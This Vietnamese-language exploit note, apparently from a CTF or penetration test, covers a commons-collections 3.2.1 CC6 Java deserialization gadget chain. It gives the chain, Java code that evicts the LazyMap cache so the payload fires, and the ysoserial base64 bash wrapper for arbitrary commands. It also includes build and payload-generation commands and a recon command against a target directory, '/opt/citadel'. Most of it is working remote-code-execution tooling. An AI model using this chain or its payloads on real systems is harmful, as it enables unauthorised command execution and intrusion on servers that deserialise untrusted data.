# 03 — CC6 gadget (commons-collections 3.2.1)

## Tại sao CC6

- Classpath có `commons-collections-3.2.1.jar` (xác nhận qua diagnostics) — 3.2.1 **chưa có** guard `InvokerTransformer.readObject` check ObjectInputStream (chỉ thêm ở 3.2.2).
- CC6 là chain ổn định nhất cho JDK hiện đại vì không cần `TransformingComparator`/`AnnotationInvocationHandler` (bị chặn từ JDK 8u71+ / module system).

## Chain

```
HashSet.readObject()
  → HashMap.put(key, key) → hash(key) → key.hashCode()
    → TiedMapEntry.hashCode() → map.get(key)
      → LazyMap.get(key)          // miss → factory.transform(key)
        → ChainedTransformer.transform()
          → ConstantTransformer(Runtime.class)
          → InvokerTransformer("getMethod",  {"getRuntime"})
          → InvokerTransformer("invoke",    {null, null})
          → InvokerTransformer("exec",      {cmd})
```

## ⚠️ Bug kinh điển phải fix: LazyMap cache

Code naive (sai):

```java
HashSet<Object> hs = new HashSet<>();
hs.add(tied);        // <- gọi hashCode → LazyMap.get("rck") → chạy factory VÔ HẠI
                     //    và CACHE kết quả "1" vào map dưới key "rck"
// swap chain thật vào iTransformers
serialize(hs);       // deserialize: TiedMapEntry.hashCode → map.get("rck")
                     // -> HIT CACHE, factory KHÔNG ĐƯỢC GỌI → gadget câm
```

Đã test local xác nhận hành vi này — readObject xong xuôi, không có side-effect nào.

Fix — **evict entry trước khi serialize**:

```java
hs.add(tied);              // hashCode chạy với factory vô hại, cache "1"
lazy.remove("rck");        // ← KEY: xóa cache để deserialize bắt buộc gọi factory
Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(chained, realChain); // arm
serialize(hs);
```

Chú ý `lazy` là `LazyMap` (decorator) — phải gọi `lazy.remove(...)` qua interface `Map`, cast về `HashMap` sẽ ClassCastException.

Verify local (quan trọng — luôn làm trước khi gửi lên target):

```bash
java -cp cc.jar:. Gen 'touch /tmp/cc321/LOCAL_PROOF' p_local.bin
java -cp "cc.jar:." ReadIt p_local.bin     # readObject → HashSet
ls /tmp/cc321/LOCAL_PROOF                   # file tồn tại = gadget nổ
```

## Command wrapper — tránh khoảng trắng

`Runtime.exec(String)` tokenize theo khoảng trắng nên không hỗ trợ redirect/pipe trực tiếp. Dùng trick `{echo,base64}` của ysoserial (không chứa space):

```
bash -c {echo,<base64 command>}|{base64,-d}|bash
```

Ví dụ lệnh recon:

```bash
CMD='ls -laR /opt/citadel > /opt/citadel/shared/ls.txt 2>&1'
B64=$(printf '%s' "$CMD" | base64)
java -cp cc.jar:. Gen "bash -c {echo,${B64}}|{base64,-d}|bash" p.bin
```

Lệnh đơn giản không cần meta-character (`touch /opt/citadel/shared/T1`) chạy trực tiếp không wrapper — dùng để confirm RCE tồn tại trước khi phức tạp hoá.

## Lệnh build đầy đủ

```bash
mkdir -p /tmp/cc321 && cd /tmp/cc321
curl -sLO "https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar" -o cc.jar
# Gen.java: xem exploit/Gen.java
javac -cp cc.jar Gen.java
java -cp cc.jar:. Gen '<command>' payload.bin
```

Source đầy đủ: [exploit/Gen.java](exploit/Gen.java), [exploit/ReadIt.java](exploit/ReadIt.java) (test local).
